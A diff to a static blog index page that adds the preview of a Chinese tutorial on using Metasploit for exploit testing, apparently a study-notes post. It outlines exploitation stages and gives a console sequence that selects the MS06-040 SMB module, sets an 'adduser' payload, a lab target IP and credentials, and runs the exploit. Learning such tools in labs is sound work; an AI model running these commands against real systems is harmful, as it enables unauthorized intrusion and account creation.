@@ -147,6 +147,89 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-0day安全2--metaspoit开发exploit" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/">0day安全2--metaspoit开发exploit</a>
+    </h1>
+  
+
+        
+        
+<a href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/" class="archive-article-date">
+  	<time datetime="2019-11-13T16:01:10.651Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="用MetaSploit开发Exploit"><a href="#用MetaSploit开发Exploit" class="headerlink" title="用MetaSploit开发Exploit"></a>用MetaSploit开发Exploit</h1><blockquote>
+<p>前言：对于学习汇编语言、逆向、二进制有困难的同学，极力推荐MSF，就像软件开发中的MFC架构、.net架构一样，安全技术领域的开发有其独特的平台—通用化漏洞测试、利用平台—MSF</p>
+</blockquote>
+<h2 id="1-漏洞测试平台MSF简介"><a href="#1-漏洞测试平台MSF简介" class="headerlink" title="1.漏洞测试平台MSF简介"></a>1.漏洞测试平台MSF简介</h2><p>通过栈溢出的讲解，其实可以归纳出漏洞利用技术的一些独立过程</p>
+<p>（1）触发漏洞：缓冲区有多大，第几个字节淹没返回地址，如何植入代码<br>（2）选取shellcode，执行什么样的shellcode？作为安全测试?还是用于入侵的端口绑定？恶意的网站下载、木马上传?<br>（3）重要的参数设置：设置目标主机的IP、端口号、消息框所选内容等等<br>（4）选用编码、解码算法：为了保护shellcode进行编码，为了正常执行shellcode进行解码等等</p>
+<p>针对漏洞的攻击测试，能不能进行模块化的生产与组装?使之能够做到对任意目标、使用任意航线，选取适当引爆方式等等。2003年7月，H D Moore开发的–MetaSploit1.0，实现了对漏洞测试的各个环节进行了封装、模块化、标准化架构。</p>
+<h2 id="2-metasploit的使用介绍："><a href="#2-metasploit的使用介绍：" class="headerlink" title="2.metasploit的使用介绍："></a>2.metasploit的使用介绍：</h2><p>metasploit提供了3套用户界面：GUI界面、普通命令行界面（console）、Ruby命令界面。主要介绍GUI界面和console界面</p>
+<h3 id="GUI界面："><a href="#GUI界面：" class="headerlink" title="GUI界面："></a>GUI界面：</h3><p>如图：<br><img src="" alt="show1"><br>单机Exploits，会返回出Metasploit所能测试的所有漏洞及其描述，之后可以在搜索栏中输入，搜索漏洞的exploit模块，选择模块点击后可以选择配置target，之后MSF会自动列出所有可以哦用于这个漏洞的shellcode，选择后进行payload配置。</p>
+<h3 id="console界面"><a href="#console界面" class="headerlink" title="console界面"></a>console界面</h3><p>个人比较倾向于使用console界面，并且喜欢利用kali虚拟机，kali虚拟机集成了各种渗透、攻击软件、平台与模块，使用起来方便可控。<br>（1）show exploits<br>显示 MetaSploit 目前所能够测试的所有漏洞及相关描述。<br>（2）use windows/smb/ms06_040_netapi<br>选择 MS06-040 进行测试。<br>（3）info<br>显示当前所选漏洞的描述信息。<br>（4）show targets<br>显示当前所选漏洞能够影响的操作系统。<br>（5）set target 0<br>设置 target 为 0，即自动识别 Windows 2000 和 Windows XP 系统。<br>（6）show payloads<br>显示可适用于当前所选漏洞的 shellcode。<br>（7）set payload windows/adduser<br>选用 adduser 为 shellcode。<br>（8）show options<br>显示当前所选漏洞和 shellcode 需要配置的选项。<br>（9）set RHOST 192.168.88.137<br>按照 show options 的提示设置目标主机地址。<br>（10）set PASS 123456<br>按照 show options 的提示设置账户密码。<br>（11）set USER failwest<br>按照 show options 的提示设置用户名。<br>（11）exploit<br>进行攻击测试。  </p>
+<h2 id="3-利用MSF制作shellcode"><a href="#3-利用MSF制作shellcode" class="headerlink" title="3.利用MSF制作shellcode"></a>3.利用MSF制作shellcode</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">-0day安全 -metasploit -msf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/11/14/0day%E5%AE%89%E5%85%A82--metaspoit%E5%BC%80%E5%8F%91exploit/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-0day安全--栈溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -819,7 +902,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">操作系统</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">计网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">-0day安全 -metasploit -msf</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -827,11 +914,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">兔兔和小船</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">操作系统</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">计网</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">兔兔和小船</a>
               </li>
             
             <div class="clearfix"></div>
